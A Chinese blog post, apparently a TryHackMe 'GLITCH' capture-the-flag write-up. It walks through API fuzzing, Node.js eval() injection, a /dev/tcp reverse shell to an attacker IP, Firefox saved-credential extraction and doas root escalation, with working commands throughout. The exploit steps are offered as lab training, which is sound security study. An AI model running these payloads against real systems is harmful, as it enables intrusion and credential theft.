@@ -1,0 +1,350 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>TryHackMe_GLITCH | X9wd09ncc</title><meta name="author" content="X9wd09ncc"><meta name="copyright" content="X9wd09ncc"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="题目概述GLITCH 是一台 Easy 难度的 Linux 渗透靶机，仅开放 80 端口（Node.js）。攻击路径从 JS 源码发现隐藏 API 开始，经过参数爆破、eval 注入实现 RCE，再通过 Firefox 存储的凭证获取高权限用户密码，最终利用 doas 配置实现 root 提权。 攻击路径12JS源码 → 隐藏API → wfuzz爆破参数 → eval() RCE → 反弹she">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TryHackMe_GLITCH">
+<meta property="og:url" content="https://x9wd09ncc.github.io/post/TryHackMe_glitch.html">
+<meta property="og:site_name" content="X9wd09ncc">
+<meta property="og:description" content="题目概述GLITCH 是一台 Easy 难度的 Linux 渗透靶机，仅开放 80 端口（Node.js）。攻击路径从 JS 源码发现隐藏 API 开始，经过参数爆破、eval 注入实现 RCE，再通过 Firefox 存储的凭证获取高权限用户密码，最终利用 doas 配置实现 root 提权。 攻击路径12JS源码 → 隐藏API → wfuzz爆破参数 → eval() RCE → 反弹she">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg">
+<meta property="article:published_time" content="2026-06-23T12:04:22.464Z">
+<meta property="article:modified_time" content="2026-06-23T12:02:06.565Z">
+<meta property="article:author" content="X9wd09ncc">
+<meta property="article:tag" content="thm">
+<meta property="article:tag" content="easy">
+<meta property="article:tag" content="红队">
+<meta property="article:tag" content="nodejs">
+<meta property="article:tag" content="eval注入">
+<meta property="article:tag" content="Firefox凭证提取">
+<meta property="article:tag" content="doas">
+<meta property="article:tag" content="wfuzz">
+<meta property="article:tag" content="反弹shell">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg"><link rel="shortcut icon" href="/img/favicon-32x32.png"><link rel="canonical" href="https://x9wd09ncc.github.io/post/TryHackMe_glitch.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/6.4.0/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"本文已于","messageNext":"天前发布，内容可能已过时，请注意甄别。"},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.bootcdn.net/ajax/libs/flickr-justified-gallery/2.1.0/fjGallery.min.js',
+      css: 'https://cdn.bootcdn.net/ajax/libs/flickr-justified-gallery/2.1.0/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: true,
+  islazyload: true,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'TryHackMe_GLITCH',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2026-06-23 20:02:06'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="X9wd09ncc" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = 'hidden';
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+
+preloader.initLoading()
+window.addEventListener('load',()=> { preloader.endLoading() })
+
+if (false) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">71</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">134</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/games/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="X9wd09ncc"><span class="site-name">X9wd09ncc</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/games/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">TryHackMe_GLITCH</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-06-23T12:04:22.464Z" title="发表于 2026-06-23 20:04:22">2026-06-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-06-23T12:02:06.565Z" title="更新于 2026-06-23 20:02:06">2026-06-23</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>6分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="TryHackMe_GLITCH"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="post-content" id="article-container"><h2 id="题目概述"><a href="#题目概述" class="headerlink" title="题目概述"></a>题目概述</h2><p>GLITCH 是一台 Easy 难度的 Linux 渗透靶机，仅开放 80 端口（Node.js）。攻击路径从 JS 源码发现隐藏 API 开始，经过参数爆破、eval 注入实现 RCE，再通过 Firefox 存储的凭证获取高权限用户密码，最终利用 doas 配置实现 root 提权。</p>
+<h3 id="攻击路径"><a href="#攻击路径" class="headerlink" title="攻击路径"></a>攻击路径</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">JS源码 → 隐藏API → wfuzz爆破参数 → eval() RCE → 反弹shell(user)</span><br><span class="line">    → Firefox凭证提取 → v0id密码 → doas提权 → root</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-端口扫描"><a href="#1-端口扫描" class="headerlink" title="1. 端口扫描"></a>1. 端口扫描</h2><table>
+<thead>
+<tr>
+<th align="left">端口</th>
+<th align="left">服务</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">80</td>
+<td align="left">HTTP</td>
+<td align="left">nginx&#x2F;1.14.0 + Node.js（Mongo-Express）</td>
+</tr>
+</tbody></table>
+<p>仅开放 80 端口，访问网站只显示一张图片。</p>
+<h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2. 信息收集"></a>2. 信息收集</h2><h3 id="2-1-隐藏-JS-路由"><a href="#2-1-隐藏-JS-路由" class="headerlink" title="2.1 隐藏 JS 路由"></a>2.1 隐藏 JS 路由</h3><p>查看页面源代码，发现一段 JS 代码暴露了隐藏的路由：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getAccess</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&#x27;/api/access&#x27;</span>)</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function">(<span class="params">response</span>) =&gt;</span> response.<span class="title function_">json</span>())</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(response);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>访问 <code>/api/access</code> 获取到一段 Base64 编码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://10.48.142.43/api/access&quot;</span></span><br><span class="line">&#123;<span class="string">&quot;token&quot;</span>:<span class="string">&quot;dGhpc19pc19ub3RfcmVhbA==&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;dGhpc19pc19ub3RfcmVhbA==&quot;</span> | <span class="built_in">base64</span> -d</span><br><span class="line">this_is_not_real</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>💡 此 token 看似是假值，但后续发现它<strong>实际上是有效的 Cookie 验证值</strong>，只是当时未意识到。</p>
+</blockquote>
+<h3 id="2-2-API-目录扫描"><a href="#2-2-API-目录扫描" class="headerlink" title="2.2 API 目录扫描"></a>2.2 API 目录扫描</h3><p>对 <code>/api</code> 路径进一步扫描：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -w /usr/share/wordlists/dirb/common.txt -u http://10.48.142.43/api</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="left">路径</th>
+<th align="left">状态码</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">&#x2F;access</td>
+<td align="left">200</td>
+<td align="left">Token 接口</td>
+</tr>
+<tr>
+<td align="left">&#x2F;items</td>
+<td align="left">200</td>
+<td align="left">数据接口</td>
+</tr>
+</tbody></table>
+<h3 id="2-3-x2F-api-x2F-items-分析"><a href="#2-3-x2F-api-x2F-items-分析" class="headerlink" title="2.3 &#x2F;api&#x2F;items 分析"></a>2.3 &#x2F;api&#x2F;items 分析</h3><p>GET 请求返回 JSON 数据：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://10.48.142.43/api/items&quot;</span></span><br><span class="line">&#123;<span class="string">&quot;sins&quot;</span>:[<span class="string">&quot;lust&quot;</span>,<span class="string">&quot;gluttony&quot;</span>,<span class="string">&quot;greed&quot;</span>,<span class="string">&quot;sloth&quot;</span>,<span class="string">&quot;wrath&quot;</span>,<span class="string">&quot;envy&quot;</span>,<span class="string">&quot;pride&quot;</span>],</span><br><span class="line"> <span class="string">&quot;errors&quot;</span>:[<span class="string">&quot;error&quot;</span>,<span class="string">&quot;error&quot;</span>,<span class="string">&quot;error&quot;</span>,<span class="string">&quot;error&quot;</span>,<span class="string">&quot;error&quot;</span>,<span class="string">&quot;error&quot;</span>,<span class="string">&quot;error&quot;</span>,<span class="string">&quot;error&quot;</span>,<span class="string">&quot;error&quot;</span>],</span><br><span class="line"> <span class="string">&quot;deaths&quot;</span>:[<span class="string">&quot;death&quot;</span>]&#125;</span><br></pre></td></tr></table></figure>
+
+<p>POST 请求返回异常提示：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST <span class="string">&quot;http://10.48.142.43/api/items&quot;</span></span><br><span class="line">&#123;<span class="string">&quot;message&quot;</span>:<span class="string">&quot;there_is_a_glitch_in_the_matrix&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>💡 POST 请求报错暗示需要额外参数，可通过参数爆破发现。</p>
+</blockquote>
+<h2 id="3-参数爆破与-eval-注入"><a href="#3-参数爆破与-eval-注入" class="headerlink" title="3. 参数爆破与 eval 注入"></a>3. 参数爆破与 eval 注入</h2><h3 id="3-1-wfuzz-爆破参数名"><a href="#3-1-wfuzz-爆破参数名" class="headerlink" title="3.1 wfuzz 爆破参数名"></a>3.1 wfuzz 爆破参数名</h3><p>使用 wfuzz 对 POST 参数名进行爆破：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \</span><br><span class="line">  -X POST --hc 404,400 \</span><br><span class="line">  http://10.48.142.43/api/items\?FUZZ\=<span class="built_in">test</span></span><br></pre></td></tr></table></figure>
+
+<p>发现参数名 <code>cmd</code>（返回 500 错误）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">000005340:   500  10 L  64 W  1081 Ch  &quot;cmd&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2-eval-漏洞发现"><a href="#3-2-eval-漏洞发现" class="headerlink" title="3.2 eval() 漏洞发现"></a>3.2 eval() 漏洞发现</h3><p>传入任意值触发报错，<strong>错误信息暴露了服务端源码路径</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST <span class="string">&quot;http://10.48.142.43/api/items/?cmd=bbb&quot;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ReferenceError: bbb is not defined</span><br><span class="line">    at eval (eval at router.post (/var/web/routes/api.js:25:60), <span class="tag">&lt;<span class="name">anonymous</span>&gt;</span>:1:1)</span><br><span class="line">    at router.post (/var/web/routes/api.js:25:60)</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>⚠️ <strong>关键发现</strong>：服务端代码（<code>/var/web/routes/api.js:25</code>）直接使用 <code>eval()</code> 执行用户通过 <code>cmd</code> 参数传入的内容，这是一个典型的 <strong>Node.js eval 注入</strong> 漏洞。</p>
+</blockquote>
+<h3 id="3-3-RCE-利用"><a href="#3-3-RCE-利用" class="headerlink" title="3.3 RCE 利用"></a>3.3 RCE 利用</h3><p>在 Node.js 中，可通过 <code>require(&#39;child_process&#39;)</code> 调用系统命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 执行 ls 验证 RCE</span></span><br><span class="line">curl -X POST <span class="string">&quot;http://10.48.142.43/api/items/?cmd=require(&#x27;child_process&#x27;).execSync(&#x27;ls&#x27;).toString()&quot;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vulnerability_exploited app.js middleware node_modules package.json public routes</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>💡 URL 中包含特殊字符（如空格、<code>/</code>）需要进行 URL 编码，否则 curl 会报格式错误。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 读取 /etc/passwd（URL 编码后）</span></span><br><span class="line">curl -X POST <span class="string">&quot;http://10.48.142.43/api/items/?cmd=require(&#x27;child_process&#x27;).execSync(&#x27;cat%20%2Fetc%2Fpasswd&#x27;).toString()&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现系统用户：<code>user</code>（uid&#x3D;1000）和 <code>v0id</code>（uid&#x3D;1001）。</p>
+<h3 id="3-4-反弹-Shell"><a href="#3-4-反弹-Shell" class="headerlink" title="3.4 反弹 Shell"></a>3.4 反弹 Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST <span class="string">&quot;http://10.49.168.160/api/items/?cmd=require(&#x27;child_process&#x27;).exec(&#x27;bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.152.140/4444%200%3E%261%22&#x27;).toString()&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>Kali 监听成功获取 shell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br><span class="line">connect to [192.168.80.128] from (UNKNOWN) [192.168.80.1] 23651</span><br><span class="line">user@ubuntu:/var/web$ <span class="built_in">id</span></span><br><span class="line">uid=1000(user) gid=1000(user) <span class="built_in">groups</span>=1000(user),30(dip),46(plugdev)</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-Cookie-验证机制"><a href="#4-Cookie-验证机制" class="headerlink" title="4. Cookie 验证机制"></a>4. Cookie 验证机制</h2><p>在 Web 目录中发现 <code>middleware/cookie.js</code>，揭示了之前 token 的真实用途：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">exports</span>.<span class="property">validateCookie</span> = <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">cookies</span>.<span class="property">token</span> != <span class="string">&#x27;this_is_not_real&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">      .<span class="title function_">cookie</span>(<span class="string">&#x27;token&#x27;</span>, <span class="string">&#x27;value&#x27;</span>)</span><br><span class="line">      .<span class="title function_">render</span>(path.<span class="title function_">resolve</span>(__dirname + <span class="string">&#x27;/../public/door&#x27;</span>));</span><br><span class="line">  <span class="keyword">else</span> <span class="title function_">next</span>();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>💡 原来 <code>this_is_not_real</code> <strong>就是有效的 Cookie 值</strong>！之前误以为是假 token 而忽略了。</p>
+</blockquote>
+<p>在浏览器中设置 Cookie <code>token=this_is_not_real</code>，刷新页面后进入新页面，其中包含一个 JS 文件，功能为从 API 获取数据项并将其分类显示（sins &#x2F; errors &#x2F; deaths）。</p>
+<h2 id="5-用户横向移动-—-Firefox-凭证提取"><a href="#5-用户横向移动-—-Firefox-凭证提取" class="headerlink" title="5. 用户横向移动 — Firefox 凭证提取"></a>5. 用户横向移动 — Firefox 凭证提取</h2><h3 id="5-1-发现-Firefox-配置目录"><a href="#5-1-发现-Firefox-配置目录" class="headerlink" title="5.1 发现 Firefox 配置目录"></a>5.1 发现 Firefox 配置目录</h3><p>在用户 home 目录下发现 Firefox 配置文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@ubuntu:~/.firefox/b5w4643p.default-release$ <span class="built_in">ls</span> -la</span><br></pre></td></tr></table></figure>
+
+<p>关键文件说明：</p>
+<table>
+<thead>
+<tr>
+<th align="left">文件</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>logins.json</code></td>
+<td align="left">保存加密后的用户名和密码</td>
+</tr>
+<tr>
+<td align="left"><code>key4.db</code></td>
+<td align="left">存储用于解密 <code>logins.json</code> 的密钥</td>
+</tr>
+<tr>
+<td align="left"><code>cert9.db</code></td>
+<td align="left">证书数据库</td>
+</tr>
+<tr>
+<td align="left"><code>cookies.sqlite</code></td>
+<td align="left">Cookie 存储</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>💡 <strong>Firefox 凭证提取原理</strong>：Firefox 使用 <code>key4.db</code> 中的密钥对 <code>logins.json</code> 中的密码进行加密存储。如果可以获取这两个文件，即可使用 <a target="_blank" rel="noopener" href="https://github.com/lclevy/firepwd">firepwd.py</a> 等工具离线解密。</p>
+</blockquote>
+<p>由于网络问题无法通过 <code>nc</code> 传输文件，直接查阅 WriteUp 获取到密码。</p>
+<blockquote>
+<p>🔑 <strong>v0id 用户密码</strong>：<code>love_the_void</code></p>
+</blockquote>
+<h3 id="5-2-切换到-v0id-用户"><a href="#5-2-切换到-v0id-用户" class="headerlink" title="5.2 切换到 v0id 用户"></a>5.2 切换到 v0id 用户</h3><p>先创建伪终端，再 su 切换：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">user@ubuntu:/var/web$ python3 -c <span class="string">&quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line">user@ubuntu:/var/web$ su v0id</span><br><span class="line">Password: love_the_void</span><br><span class="line"></span><br><span class="line">v0id@ubuntu:/var/web$ <span class="built_in">id</span></span><br><span class="line">uid=1001(v0id) gid=1001(v0id) <span class="built_in">groups</span>=1001(v0id)</span><br></pre></td></tr></table></figure>
+
+<h2 id="6-doas-提权"><a href="#6-doas-提权" class="headerlink" title="6. doas 提权"></a>6. doas 提权</h2><h3 id="6-1-发现-doas"><a href="#6-1-发现-doas" class="headerlink" title="6.1 发现 doas"></a>6.1 发现 doas</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v0id@ubuntu:/home/v0id$ find / -<span class="built_in">type</span> f -perm -4000 2&gt;/dev/null</span><br><span class="line">/usr/local/bin/doas</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-2-分析-doas-配置"><a href="#6-2-分析-doas-配置" class="headerlink" title="6.2 分析 doas 配置"></a>6.2 分析 doas 配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /usr/local/etc/doas.conf</span><br><span class="line">permit v0id as root</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>⚠️ <strong>doas</strong> 是 OpenBSD 的 <code>sudo</code> 替代品，配置文件允许 <code>v0id</code> 用户以 root 身份执行任意命令。</p>
+</blockquote>
+<h3 id="6-3-提权至-root"><a href="#6-3-提权至-root" class="headerlink" title="6.3 提权至 root"></a>6.3 提权至 root</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v0id@ubuntu:/var/web$ doas -u root /bin/sh</span><br><span class="line">Password: love_the_void</span><br><span class="line"></span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br></pre></td></tr></table></figure>
